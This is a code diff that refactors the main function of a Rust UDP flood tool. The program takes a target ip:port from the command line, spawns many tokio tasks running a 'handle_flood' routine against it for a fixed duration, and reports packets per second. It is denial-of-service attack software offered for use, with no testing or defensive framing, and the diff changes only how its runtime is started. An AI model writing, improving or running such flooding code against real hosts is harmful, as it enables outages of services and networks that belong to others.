@@ -1,4 +1,5 @@
 use tokio::net::UdpSocket;
+use tokio::runtime::Builder; // Import the runtime Builder
 use tokio::time::{sleep, Duration};
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::Arc;
@@ -53,43 +54,51 @@ async fn pps_monitor(packet_count: Arc<AtomicU64>, running: Arc<AtomicU64>) {
     }
 }
 
-#[tokio::main]
-async fn main() -> Result<()> {
-    let args: Vec<String> = env::args().collect();
-    if args.len() != 2 {
-        eprintln!("Usage: {} <ip:port>", args[0]);
-        return Ok(());
-    }
-    let target = args[1].clone();
+// The main function is now synchronous
+fn main() -> Result<()> {
+    // Manually build the Tokio runtime
+    let runtime = Builder::new_multi_thread()
+        .enable_all()
+        .build()?;
 
-    println!("Target set: {}", target);
+    // Use block_on to run the async code
+    runtime.block_on(async {
+        let args: Vec<String> = env::args().collect();
+        if args.len() != 2 {
+            eprintln!("Usage: {} <ip:port>", args[0]);
+            return; // Exit the async block
+        }
+        let target = args[1].clone();
 
-    let packet_count = Arc::new(AtomicU64::new(0));
-    let running = Arc::new(AtomicU64::new(1));
+        println!("Target set: {}", target);
 
-    let monitor_handle = {
-        let pc = Arc::clone(&packet_count);
-        let run = Arc::clone(&running);
-        tokio::spawn(pps_monitor(pc, run))
-    };
+        let packet_count = Arc::new(AtomicU64::new(0));
+        let running = Arc::new(AtomicU64::new(1));
 
-    let mut flood_tasks = vec![];
-    for _ in 0..THREADS {
-        let pc = Arc::clone(&packet_count);
-        let run = Arc::clone(&running);
-        let tgt = target.clone();
-        flood_tasks.push(tokio::spawn(handle_flood(tgt, pc, run)));
-    }
+        let monitor_handle = {
+            let pc = Arc::clone(&packet_count);
+            let run = Arc::clone(&running);
+            tokio::spawn(pps_monitor(pc, run))
+        };
 
-    sleep(Duration::from_secs(DURATION_SECONDS)).await;
-    running.store(0, Ordering::Relaxed);
+        let mut flood_tasks = vec![];
+        for _ in 0..THREADS {
+            let pc = Arc::clone(&packet_count);
+            let run = Arc::clone(&running);
+            let tgt = target.clone();
+            flood_tasks.push(tokio::spawn(handle_flood(tgt, pc, run)));
+        }
 
-    for task in flood_tasks {
-        let _ = task.await;
-    }
-    let _ = monitor_handle.await;
+        sleep(Duration::from_secs(DURATION_SECONDS)).await;
+        running.store(0, Ordering::Relaxed);
 
-    println!("Stopped for target: {}", target);
+        for task in flood_tasks {
+            let _ = task.await;
+        }
+        let _ = monitor_handle.await;
+
+        println!("Stopped for target: {}", target);
+    });
 
     Ok(())
 }
